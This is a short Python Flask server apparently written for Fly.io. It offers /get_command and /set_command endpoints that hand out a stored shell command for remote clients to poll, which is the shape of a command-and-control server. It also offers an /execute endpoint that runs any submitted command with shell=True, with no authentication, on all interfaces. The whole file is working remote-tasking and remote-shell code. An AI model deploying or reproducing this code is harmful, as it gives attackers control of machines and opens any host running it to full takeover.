from flask import Flask, request, jsonify
import subprocess
import os  # Import os to get the PORT from Fly.io

app = Flask(__name__)

# Store the latest command
latest_command = "whoami"

@app.route('/get_command', methods=['GET'])
def get_command():
    return jsonify({"cmd": latest_command})

@app.route('/set_command', methods=['POST'])
def set_command():
    global latest_command
    latest_command = request.json.get("cmd", "whoami")
    return jsonify({"status": "Command updated"})

@app.route('/execute', methods=['POST'])
def execute():
    command = request.json.get('cmd')
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return {"output": result}
    except Exception as e:
        return {"error": str(e)}

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))  # Get Fly.io's assigned port
    app.run(host='0.0.0.0', port=port)
